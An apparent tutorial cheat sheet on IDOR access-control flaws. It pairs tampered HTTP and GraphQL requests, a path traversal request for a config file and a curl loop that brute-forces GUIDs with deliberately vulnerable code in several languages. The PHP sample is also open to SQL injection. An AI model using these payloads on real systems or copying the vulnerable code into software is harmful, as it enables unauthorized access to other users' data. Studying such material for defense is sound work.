### Insecure Direct Object Reference (IDOR)

Insecure Direct Object Reference (IDOR) is a type of access control vulnerability that arises when an application uses a user-supplied input to directly access an internal implementation object, such as a file, database key, or directory. Attackers can manipulate these references to access data belonging to other users without authorization.

* **Vulnerability Type:** Broken Access Control (A01:2021)
* **Impact:** Unauthorized viewing, modification, or deletion of other users' data (e.g., profiles, financial records, files)
* **Root Cause:** The application trusts user input (like IDs or filenames) and fails to perform a server-side authorization check to confirm that the current user is the owner of the requested object.

-----

### Common IDOR Attack Vectors

#### URL Parameter Manipulation

```http
GET /api/v1/accounts/105 HTTP/1.1
Host: target.com
Authorization: Bearer user_token_505
```

* **Tampered Request:**

```http
GET /api/v1/accounts/106 HTTP/1.1
Host: target.com
Authorization: Bearer user_token_505
```

* **Vulnerable PHP Code:**

```php
<?php
    $user_id = $_GET['user_id'];
    $query = "SELECT * FROM users WHERE id = $user_id";
    $result = mysqli_query($conn, $query);
    $user = mysqli_fetch_assoc($result);
    echo json_encode($user);
?>
```

* **Why it's used:** To access unauthorized resources by manipulating sequential IDs in URLs.
* **How it works:** Attackers increment or guess object identifiers to access other users' data.

#### POST Body and JSON Manipulation

```http
POST /api/v1/orders/update HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"order_id": 1001, "user_id": 505, "item": "Laptop", "status": "Pending"}
```

* **Tampered Request:**

```http
POST /api/v1/orders/update HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"order_id": 1002, "user_id": 506, "item": "Laptop", "status": "Cancelled"}
```

* **Vulnerable Node.js Code:**

```javascript
app.put('/api/orders/:orderId', (req, res) => {
    const orderId = req.params.orderId;
    const { user_id, status } = req.body;
    
    // No authorization check - direct update
    db.query('UPDATE orders SET status = ? WHERE id = ? AND user_id = ?', 
      [status, orderId, user_id]);
    res.json({success: true});
});
```

* **Why it's used:** To modify data belonging to other users through API endpoints.
* **How it works:** Attackers change user_id or other identifiers in request bodies to affect unauthorized accounts.

#### Hidden Field and Cookie Manipulation

```html
<form action="/transfer" method="post">
    <input type="hidden" name="from_account" value="ACC505">
    <input type="hidden" name="to_account" value="ACC789">
    <input type="number" name="amount" value="100">
    <button type="submit">Transfer</button>
</form>
```

**Tampered Request:**

```html
<!-- Modified hidden fields -->
<input type="hidden" name="from_account" value="ACC506">
<input type="hidden" name="to_account" value="ACC999">
```

* **Why it's used:** To exploit identifiers stored in hidden form fields or cookies.
* **How it works:** Attackers modify hidden values that the application trusts without validation.

-----

### Advanced IDOR Vectors and Identifier Types

#### Direct File Path IDOR (Path Traversal)

```http
GET /download?filename=user_505_report.pdf HTTP/1.1
Host: target.com
Authorization: Bearer user_token_505
```

* **Tampered Request:**

```http
GET /download?filename=../admin/config.php HTTP/1.1
Host: target.com
Authorization: Bearer user_token_505
```

* **Vulnerable Java Code:**

```java
@GetMapping("/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
    // Vulnerable - no path validation
    Path filePath = Paths.get("uploads/" + filename);
    Resource resource = new FileSystemResource(filePath);
    return ResponseEntity.ok().body(resource);
}
```

* **Why it's used:** To access sensitive files by manipulating file path parameters.
* **How it works:** Combines IDOR with path traversal to access unauthorized directories and files.

#### Exploiting GUIDs and Hashed IDs

```http
GET /api/documents/a1b2c3d4-e5f6-7890-abcd-ef1234567890 HTTP/1.1
Host: target.com
```

* **Enumeration Attack:**

```bash
# Brute force GUIDs
for guid in $(cat guids_list.txt); do
    curl -H "Authorization: Bearer $token" "https://target.com/api/documents/$guid"
done
```

* **Vulnerable Python Code:**

```python
@app.route('/api/documents/<document_uid>')
def get_document(document_uid):
    # No ownership check - trusts the GUID
    document = db.documents.find_one({'uid': document_uid})
    return jsonify(document)
```

* **Why it's used:** To bypass "obscured" identifiers that appear random but are still enumerable.
* **How it works:** Attackers collect GUIDs from other API responses or enumerate through predictable patterns.

#### Exploiting Referenced IDs (Referenced IDOR)

```http
POST /api/user/505/update_profile HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"name": "Alice", "role_id": 1, "department_id": 5}
```

* **Tampered Request:**

```http
POST /api/user/505/update_profile HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"name": "Alice", "role_id": 99, "department_id": 1}
```

* **Vulnerable C# Code:**

```csharp
[HttpPost("update_profile/{userId}")]
public IActionResult UpdateProfile(int userId, [FromBody] ProfileUpdate model) {
    // Updates role without checking if user can assign this role
    var user = _db.Users.Find(userId);
    user.RoleId = model.RoleId; // Direct assignment - VULNERABLE
    _db.SaveChanges();
    return Ok();
}
```

* **Why it's used:** To escalate privileges by manipulating internal object references.
* **How it works:** While updating authorized objects, attackers change referenced IDs (like role_id) to gain higher privileges.

#### Mass Assignment IDOR

```http
PATCH /api/users/505 HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"name": "Alice", "email": "alice@company.com"}
```

* **Tampered Request:**

```http
PATCH /api/users/505 HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"name": "Alice", "email": "alice@company.com", "is_admin": true, "salary": 100000}
```

* **Why it's used:** To modify sensitive fields that shouldn't be user-editable.
* **How it works:** Exploits mass assignment vulnerabilities to update privileged fields.

-----

### Advanced Exploitation Techniques

#### IDOR in GraphQL APIs

```graphql
query {
  user(id: "505") {
    name
    email
    transactions {
      id
      amount
    }
  }
}
```

**Tampered Query:**

```graphql
query {
  user(id: "506") {
    name
    email
    creditCard {
      number
      expiry
    }
  }
}
```

* **Why it's used:** GraphQL often lacks built-in authorization.
* **How it works:** Direct object reference manipulation in GraphQL queries.

#### IDOR in Bulk Operations

```http
POST /api/bulk-delete HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"order_ids": [1001, 1002, 1003]}
```

* **Tampered Request:**

```http
POST /api/bulk-delete HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user_token_505

{"order_ids": [1004, 1005, 1006]}
```

* **Why it's used:** Bulk operations often have weaker authorization checks.
* **How it works:** Manipulating arrays of IDs in bulk operations.

#### Time-Based IDOR

```http
GET /api/reports?date=2024-01-15 HTTP/1.1
Host: target.com
Authorization: Bearer user_token_505
```

* **Tampered Request:**

```http
GET /api/reports?date=2024-01-16 HTTP/1.1
Host: target.com
Authorization: Bearer user_token_505
```

* **Why it's used:** Access time-restricted resources.
* **How it works:** Manipulating date parameters to access future/past data.

-----

**Made with love by VIsh0k**